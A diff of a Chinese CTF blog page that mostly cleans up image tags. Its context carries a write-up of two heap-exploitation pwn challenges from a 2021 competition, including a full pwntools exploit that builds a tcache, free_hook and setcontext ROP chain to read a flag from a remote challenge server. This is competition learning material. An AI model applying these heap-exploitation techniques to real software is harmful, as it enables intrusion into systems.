@@ -204,7 +204,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
       <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
     </div>
@@ -342,7 +342,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+          <img src="/medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">ABf1ag&#39;s blog</a>
@@ -602,12 +602,12 @@
         <h3 id="长城杯wp"><a href="#长城杯wp" class="headerlink" title="长城杯wp"></a>长城杯wp</h3><span id="more"></span>
 
 <p><em>高校组好卷，出来这么多题还是进不了线下，最后是16名。。。题目的话pwn都是常规题，还有一道虚拟机的题日后有时间复现复现</em></p>
-<p><img src="/.io//20210919171314.png" class="lazyload placeholder" data-srcset="/.io//20210919171314.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p>
+<p><img src="https://img.le1a.com/2023/02/07/36ed6a1575dee.png" alt="img"></p>
 <p>1.</p>
 <p>这题漏洞点挺多，第一个在，free后指针没置0</p>
-<p><img src="/.io//clip_image002.jpg" class="lazyload placeholder" data-srcset="/.io//clip_image002.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p>
+<p><img src="https://img.le1a.com/2023/02/07/e71d1c9b6d72a.jpg" alt="img"></p>
 <p>第二个off-by-one漏洞</p>
-<p><img src="/.io//clip_image004.jpg" class="lazyload placeholder" data-srcset="/.io//clip_image004.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p>
+<p><img src="https://img.le1a.com/2023/02/07/b57c425e35bdb.jpg" alt="img"></p>
 <p>因为没有输出功能，所以我们直接打stdout泄露出libc_base，再用unsortedbin attack将free_hook上方写入\x7f然后直接打free_hook</p>
 <p><del>不知道为啥最近利用malloc__hook、realloc_hook打gadget总是失败exceve的第三个参数总是不为0</del></p>
 <p>exp:</p>
@@ -617,9 +617,9 @@
 
 <p>2.</p>
 <p>开了沙箱</p>
-<p><img src="/.io//clip_image003.jpg" class="lazyload placeholder" data-srcset="/.io//clip_image003.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p>
+<p><img src="https://img.le1a.com/2023/02/07/13ee8a2f43a81.jpg" alt="img"></p>
 <p>这个题的漏洞点在free后没有置0</p>
-<p><img src="/.io//clip_image005.jpg" class="lazyload placeholder" data-srcset="/.io//clip_image005.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p>
+<p><img src="https://img.le1a.com/2023/02/07/34371efb2b16b.jpg" alt="img"></p>
 <p>且申请的大小也被限制在0x10~0x60之间，我们利用tcache_struct这个大小为0x250的chunk来获得libc_base，接着利用free_hook执行setcontex函数将栈迁到堆上执行我们构造的rop读取flag</p>
 <p>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">io=remote(&#x27;47.104.190.157&#x27; ,25329)</span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line">	io.sendafter(&#x27;context:\n&#x27;,context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line">def exp():</span><br><span class="line">	add(0,0x60)#0</span><br><span class="line">	add(1,0x60)#1</span><br><span class="line">	add(2,0x60)#2</span><br><span class="line">	dele(0)</span><br><span class="line">	dele(1)</span><br><span class="line">	show(1)</span><br><span class="line">	heap_base=u64(io.recvuntil(&#x27;\x55&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-0x770-0x40</span><br><span class="line">	print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">	add(1,0x60)#1</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	edit(0,p64(heap_base))</span><br><span class="line">	add(3,0x60)#3</span><br><span class="line">	</span><br><span class="line">	add(0,0x60)#tcache</span><br><span class="line">	edit(0,&#x27;\x07&#x27;*0x30+&#x27;\x00&#x27;*(0x60-0x30))</span><br><span class="line">	#gdb.attach(io)	</span><br><span class="line">	dele(0)</span><br><span class="line">	add(4,0x40)</span><br><span class="line">	edit(0,&#x27;a&#x27;*0x50)</span><br><span class="line">	</span><br><span class="line">	show(0)</span><br><span class="line">	io.recvuntil(&#x27;a&#x27;*0x50)</span><br><span class="line">	malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">	libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">	pop_rdi=0x00000000000215bf+libc_base</span><br><span class="line">	pop_rsi=0x0000000000023eea+libc_base</span><br><span class="line">	pop_rdx=0x0000000000001b96+libc_base</span><br><span class="line">	pop_rax=0x0000000000043ae8+libc_base</span><br><span class="line">	open64=libc_base+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">	read=libc_base+libc.symbols[&#x27;read&#x27;]</span><br><span class="line">	syscall=read+15</span><br><span class="line">	write=libc_base+libc.symbols[&#x27;write&#x27;]</span><br><span class="line">	setcontext=libc_base+libc.symbols[&#x27;setcontext&#x27;]+53</span><br><span class="line">	edit(0,&#x27;\x00&#x27;*2+&#x27;\x01&#x27;+&#x27;\x00&#x27;*(0x40-3)+p64(0)*2+p64(free_hook-0x8))</span><br><span class="line">		</span><br><span class="line">	add(5,0x38)#free_hook	</span><br><span class="line">	edit(0,&#x27;\x00&#x27;*0x40+p64(0)+p64(0x211)+p64(malloc_hook+96+16))</span><br><span class="line">		</span><br><span class="line">	add(6,0x58)#6</span><br><span class="line">	</span><br><span class="line">	add(7,0x58)#7</span><br><span class="line">	edit(0,&#x27;./flag\x00&#x27;)</span><br><span class="line">	edit(1,p64(heap_base+0x880+0x40))</span><br><span class="line">	edit(7,&#x27;\x00&#x27;*0x40+p64(heap_base+0x880+0x40)+p64(pop_rdi))</span><br><span class="line">	edit(5,p64(heap_base+0xb10+0x40-0xa0)+p64(setcontext))</span><br><span class="line">	#open(./flag,0)	</span><br><span class="line">	shellcode=p64(heap_base)+p64(open64)</span><br><span class="line">	#read(fd,addr,0x30)			        shellcode+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30)+p64(read)</span><br><span class="line">	#write(1,addr,0x30)</span><br><span class="line">	shellcode+=p64(pop_rdi)+p64(1)+p64(write)</span><br><span class="line">	edit(2,shellcode)</span><br><span class="line">	dele(6)	</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
@@ -661,7 +661,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload" src="/medias/11.jpg" alt="">
     </div>
     <a href="/2021/10/01/tcache-stashing-unlink-attack-xue-xi-bi-ji/" class="post-nav-link">
       <div class="title">
@@ -683,7 +683,7 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload" src="/medias/11.jpg" src="" alt="">
     </div>
     <a href="/2021/09/12/storm/" class="post-nav-link">
       <div class="title">
@@ -738,10 +738,10 @@
       </div>
       <div class="donate-box_img">
         <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+          <img src="/medias/1.jpg" alt="支付宝打赏" />
         </div> 
         <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+          <img src="/medias/2.jpg" alt="微信打赏" />
         </div>
       </div>
     </div>
@@ -952,7 +952,7 @@
             <div class="post-img-box">
               <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -973,7 +973,7 @@
             <div class="post-img-box">
               <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -994,7 +994,7 @@
             <div class="post-img-box">
               <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1015,7 +1015,7 @@
             <div class="post-img-box">
               <a href="/2022/12/30/nian-zhong-zong-jie-2022/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1036,7 +1036,7 @@
             <div class="post-img-box">
               <a href="/2022/01/19/yi-gou-pwn-xue-xi-ji-lu/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
